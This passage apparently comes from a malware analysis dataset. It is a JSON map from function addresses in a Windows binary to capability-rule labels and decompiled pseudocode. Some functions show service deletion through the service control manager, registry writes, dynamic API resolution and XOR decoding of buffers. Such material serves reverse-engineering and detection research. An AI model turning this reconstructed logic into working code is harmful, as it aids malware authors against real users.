            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402e60(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(var_4h + arg_8h) = iVar1 % 0x1a + 'a';\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004030a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004030f7) overlaps instruction at (ram,0x004030f6)\n// \n// WARNING: Removing unreachable block (ram,0x004030be)\n// WARNING: Removing unreachable block (ram,0x004030c5)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.004030a0(uint *param_1, uint *param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    uint8_t uVar7;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar8;\n    bool bVar9;\n    float10 extraout_ST0;\n    float10 fVar10;\n    float10 extraout_ST1;\n    float10 fVar11;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    unkbyte6 Var12;\n    char in_stack_f04d89bc;\n    uchar uStack108;\n    uint uStack107;\n    uint8_t uStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar8 = &uStack107;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    bVar9 = true;\n    uVar7 = &uStack108 >> 0x18;\n    Var12 = fcn.00402f20(&uStack108, &uStack8);\n    if ((!bVar9) && (bVar9)) {\n        uVar2 = in(Var12 >> 0x20);\n        *(puVar8 + 3) = uVar2;\n        iVar6 = extraout_ECX;\n        fVar10 = extraout_ST0;\n        fVar11 = extraout_ST1;\n        if (0 < &stack0xffffff88) {\n            uVar5 = Var12 ^ 0xdee0ed6d;\n            uVar4 = uVar5 + (uVar5 >> 8) * -0x31;\n            *0x94680000 = uVar5 & 0xffff0000 | uVar4;\n            puVar1 = unaff_EBX + -0x1f9703ab;\n            *puVar1 = *puVar1 ^ extraout_ECX;\n            if (*puVar1 != 0) goto code_r0x00403103;\n            **0x94680000 = **0x94680000 + uVar4;\n            if (in_stack_f04d89bc + uVar4 == '\\0' ||\n                SCARRY1(in_stack_f04d89bc, uVar4) != in_stack_f04d89bc + uVar4 < '\\0') {\n                return;\n            }\n            iStack16 = 1;\n            unaff_ESI = iStack16;\n        }\n        do {\n            uVar4 = *(iStack12 + param_3);\n            uVar3 = *(unaff_ESI % param_2 + param_1);\n            bVar9 = -1 < (iVar6 >> 8 ^ uVar7) << 8;\n            puVar8 = param_2;\n            if ((bVar9) && (!bVar9)) {\n                *(param_2 + 7) = fVar10;\n                puVar8 = param_2 + 5;\n                unaff_ESI = unaff_ESI + 5;\n                fVar10 = fVar11;\n                fVar11 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            uVar7 = uStack20 ^ uVar4 ^ *((unaff_ESI + -1) % puVar8 + param_1);\n            *(param_5 + -1 + iStack16) = uVar7;\n            unaff_ESI = iStack16 + 2;\n            *(iStack16 + param_5) = uStack20 ^ uVar3;\n            iVar6 = iStack12 + 1;\n            iStack16 = unaff_ESI;\n            iStack12 = iVar6;\n        } while (iVar6 < param_4);\n        return;\n    }\ncode_r0x00403103:\n    fcn.00401630();\n    *param_1 = 0x407494;\n    *param_2 = 0xa3e0;\n    return;\n}\n",
        "token_count": 1140
    },
    "004035a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004035a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "004035d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004035d0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403680(&var_68h, &var_4h);\n    fcn.00401630(&var_68h, var_4h, 0x411874, 0xd000);\n    *arg_8h = 0x411874;\n    *arg_ch = 0xd000;\n    return;\n}\n",
        "token_count": 236
    },
    "00403a70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403add) overlaps instruction at (ram,0x00403adc)\n// \n// WARNING: Removing unreachable block (ram,0x00403add)\n// WARNING: Removing unreachable block (ram,0x00403a9d)\n\nuint fcn.00403a70(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char cVar4;\n    char cVar5;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407104);\n    piVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    cVar5 = '\\0';\n    cVar4 = iVar2 < 0;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x41e890 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407114);\n    piVar3 = piVar1;\n    if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n        out(0xc4, *0x41e890);\n        piVar3 = piVar1 + 1;\n        *piVar1 = *0x41e890;\n    }\n    *0x41e894 = (*piVar3)(iVar2, 0x407130);\n    *0x41e898 = (*piVar3)(iVar2, 0x407140);\n    if (((*0x41e890 != 0) && (*0x41e894 != 0)) && (*0x41e898 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 375
    },
    "00403ed0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403f2e)\n\nuint __cdecl fcn.00403ed0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, arg_8h);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "00404490": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00404490(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405190;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    hLibModule = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &var_18h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x18);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar1 = (*pcVar3)(var_18h, str._D_3, 0, 0xdc);\n    if ((iVar1 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar1 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((-1 < iVar1) && (var_24h != NULL)) {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar1 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar1 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004048bb:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x004048c7:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar1 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar1 < 0) || (var_10h == NULL)) ||\n                       (iVar1 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar1 < 0)) {\njoined_r0x00404882:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x004048c7;\n                    }\n                    if (pbstr == 0) {\njoined_r0x004046be:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.004042c0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar4 != 0) goto joined_r0x004046be;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar1 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar1 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00404867:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004048bb;\n                        }\n                        iVar1 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar4 = var_3ch;\n                        if (iVar1 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00404867;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.004042c0(iVar4, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar4 = fcn.004043d0(&var_148h);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00404882;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n        }\n        if (var_24h != NULL) {\n            var_4h = var_4h._1_3_ << 8;\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar1;\n}\n",
        "token_count": 2334
    },
    "00401130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "get service handle",
            "write file on Windows",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040119c) overlaps instruction at (ram,0x0040119a)\n// \n\nchar * fcn.00401130(uchar param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    ulong uVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t unaff_EBX;\n    int32_t *unaff_EDI;\n    bool bVar6;\n    char cVar7;\n    char cVar8;\n    ulong uVar9;\n    uchar uVar10;\n    uchar uVar11;\n    \n    uVar2 = CONCAT44(param_4, param_3);\n    uVar9 = (*_sym.imp.MSVCRT.dll_fopen)(param_1);\n    bVar6 = uVar9 == 0;\n    if (bVar6) {\n        return NULL;\n    }\n    if (bVar6) {\ncode_r0x0040116e:\n        param_1 = param_4;\n    }\n    else {\n        if (!bVar6) goto code_r0x0040116e;\n        piVar1 = unaff_EDI + 1;\n        iVar5 = in(uVar9 >> 0x20);\n        *unaff_EDI = iVar5;\n        unaff_EDI = piVar1;\n        uVar2 = uVar9;\n        if (&stack0xfffffff4 < 1) {\n            *0xffffffff = *0xffffffff | extraout_ECX >> 8;\n            *piVar1 = *piVar1 + extraout_ECX;\n            *0x51 = *0x51 + (uVar9 >> 0x20);\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n            if (iVar5 == 0) {\n                return NULL;\n            }\n            pcVar4 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar5);\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar5);\n            return pcVar4;\n        }\n    }\n    uVar3 = uVar2 ^ 0xdee0ed6d;\n    *(unaff_EBX + 0x458b1455) = *(unaff_EBX + 0x458b1455) ^ extraout_ECX;\n    pcVar4 = uVar9 + 0x52;\n    *pcVar4 = *pcVar4 + (uVar2 >> 0x20);\n    (*_sym.imp.MSVCRT.dll_fwrite)(uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31, 1, param_1);\n    cVar7 = extraout_DX >> 8;\n    cVar8 = SCARRY1(extraout_DX, cVar7);\n    cVar7 = extraout_DX + cVar7 < '\\0';\n    (*_sym.imp.MSVCRT.dll_fflush)();\n    if (cVar8 == cVar7) {\n        iVar5 = extraout_EDX;\n        if (cVar8 != cVar7) goto code_r0x00401199;\n    }\n    uVar10 = 0xa3;\n    uVar11 = 0;\n    (*_sym.imp.MSVCRT.dll_fclose)(uVar9);\n    unaff_EDI = CONCAT13(uVar11, CONCAT21(0x4011, uVar10));\n    iVar5 = extraout_EDX_00;\ncode_r0x00401199:\n    pcVar4 = iVar5 + 1;\n    *(unaff_EBX + 0x1b808c4) = *(unaff_EBX + 0x1b808c4) + pcVar4;\n    *pcVar4 = *pcVar4 + pcVar4;\n    *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e) + unaff_EBX;\n    return pcVar4;\n}\n",
        "token_count": 919
    },
    "00401250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401266) overlaps instruction at (ram,0x00401264)\n// \n// WARNING: Removing unreachable block (ram,0x0040128d)\n// WARNING: Removing unreachable block (ram,0x004012aa)\n\nbool fcn.00401250(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *unaff_EBX;\n    char *pcVar4;\n    char in_SF;\n    char in_OF;\n    char *pvData;\n    \n    pvData = NULL;\n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        unaff_EBX = &pvData;\n    }\n    iVar2 = fcn.00403ed0(unaff_EBX);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (pvData == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = pvData;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, pvData, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 353
    },
    "00401520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401568) overlaps instruction at (ram,0x00401567)\n// \n// WARNING: Removing unreachable block (ram,0x00401565)\n\nchar * __cdecl fcn.00401520(char *arg_8h, uint32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    bVar5 = CARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar1 = (arg_8h - arg_14h) + arg_ch;\n    if ((!bVar5) && (bVar5)) {\n        out(0xbd, arg_8h);\n        return arg_8h;\n    }\n    if (arg_14h != 0) {\n        if (arg_8h <= pcVar1) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    pcVar4 = arg_10h + 1;\n                    iVar2 = arg_14h;\n                    pcVar3 = arg_8h;\n                    do {\n                        pcVar3 = pcVar3 + 1;\n                        iVar2 = iVar2 + -1;\n                        if (iVar2 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                        pcVar4 = pcVar4 + 1;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar1);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 412
    },
    "00401630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040169d) overlaps instruction at (ram,0x0040169b)\n// \n\nvoid fcn.00401630(uint param_1, uint param_2, int32_t param_3, uint32_t param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t unaff_EBX;\n    uchar *puVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    bool bVar7;\n    \n    puVar4 = &stack0xfffffffc;\n    uVar5 = 0;\n    bVar6 = false;\n    bVar7 = param_4 == 0;\n    if (!bVar7) {\n        do {\n            if ((bVar7) || (!bVar7)) {\ncode_r0x00401656:\n                param_4 = uVar5;\n                uVar5 = *(puVar4 + 8);\n                uVar3 = *(param_4 + param_3) ^ *(param_4 % *(puVar4 + 0xc) + uVar5);\n                if ((-1 < uVar3) && (-1 >= uVar3)) goto code_r0x0040169b;\n                uVar2 = *(puVar4 + 0x14);\n                *(param_4 + param_3) = uVar3;\n            }\n            else {\n                unaff_EBX = unaff_EBX + 1;\n                if (!bVar6 && unaff_EBX != 0) {\n                    in_AF = 9 < (param_4 & 0xf) | in_AF;\n                    piVar1 = (param_4 & 0xffff0000 | CONCAT11((param_4 >> 8) + in_AF, param_4 + in_AF * '\\x06') & 0xff0f\n                             ) + 0x2a;\n                    *piVar1 = *piVar1 - unaff_EBX;\n                    uVar5 = uVar5 + 1;\n                    goto code_r0x00401656;\n                }\ncode_r0x0040169b:\n                puVar4 = puVar4 + 1;\n                uVar2 = param_4 & 0xffffff00 | param_4 + 0x88 | 0x3e;\n                param_4 = uVar5;\n            }\n            uVar5 = param_4 + 1;\n            bVar6 = uVar5 < uVar2;\n            bVar7 = uVar5 == uVar2;\n            param_4 = uVar2;\n        } while (bVar6);\n    }\n    return;\n}\n",
        "token_count": 591
    },
    "00401b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b7f) overlaps instruction at (ram,0x00401b7b)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00401b30(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    ushort uVar3;\n    int32_t **ppiVar4;\n    uint uVar5;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    uint32_t unaff_EBX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    bool bVar8;\n    bool bVar9;\n    \n    uVar6 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n    bVar8 = uVar6 < 0x222c;\n    bVar9 = uVar6 == 0x222c;\n    ppiVar4 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((bVar8 || bVar9) || (uVar6 = unaff_EBX & 0xffff00ff,  !bVar8 && !bVar9)) {\n        uVar6 = arg_8h;\n    }\n    *unaff_EDI = *ppiVar4;\n    uVar6 = uVar6 & 0xffff0000 | CONCAT11(0xdf, uVar6);\n    iVar7 = *ppiVar4;\n    puVar1 = uVar6 + 0x56;\n    *puVar1 = *puVar1 | extraout_DL;\n    *ppiVar4 = 0x401b89;\n    uVar3 = fcn.004011b0(ppiVar4[1], ppiVar4[2]);\n    ppiVar4[2] = unaff_EDI + 1;\n    *(ppiVar4 + 6) = uVar3;\n    *(ppiVar4 + 1) = extraout_DX;\n    ppiVar4[2] = *(iVar7 + 0xc);\n    ppiVar4[1] = uVar6;\n    *ppiVar4 = ppiVar4 + 1;\n    ppiVar4[-1] = 0x401bae;\n    uVar5 = fcn.00404d40(*ppiVar4, ppiVar4[1], ppiVar4[2]);\n    ppiVar4[2] = ppiVar4 + 1;\n    pcVar2 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    ppiVar4[1] = 0x401bba;\n    (*pcVar2)();\n    return uVar5;\n}\n",
        "token_count": 624
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00404db0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00402ec0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00402da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402db8) overlaps instruction at (ram,0x00402db4)\n// \n\nvoid __cdecl fcn.00402da0(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    \n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        in_EAX = arg_8h;\n    }\n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar2 = in_EAX - 1U;\n    uVar1 = 9 < (uVar2 & 0xf) | in_AF;\n    uVar2 = uVar2 + uVar1 * '\\x06';\n    *in_EDX = *in_EDX + 0x458bdf84;\n    *in_EDX = *in_EDX | in_ECX >> 8;\n    (*_sym.imp.KERNEL32.dll_CreateFileA)\n              (in_EAX - 1U & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | in_CF | uVar1 * (0xf9 < uVar2)) * '`', \n               0xc0000000, 1, 0, 3, 0x80);\n    return;\n}\n",
        "token_count": 353
    },
    "00403230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403230(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004019e0(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = var_4h;\n    fcn.004019e0(arg_8h, arg_ch, &var_8h, &var_4h);\n    return 1;\n}\n",
        "token_count": 161
    },
    "00403dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403dec) overlaps instruction at (ram,0x00403de3)\n// \n\nbool __fastcall fcn.00403dd0(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    bool in_CF;\n    \n    if (!in_CF) {\n        iVar1 = param_2;\n        if (in_CF) goto code_r0x00403ddd;\n    }\n    iVar1 = 1;\n    in_EAX = param_3;\ncode_r0x00403ddd:\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n    *(param_2 + 1) = *(param_2 + 1) | param_1 >> 8;\n    iVar1 = fcn.004012f0(in_EAX + 0x7c8ecb0d + (in_CF == false), iVar1);\n    return iVar1 != 0;\n}\n",
        "token_count": 259
    },
    "004042c0": {
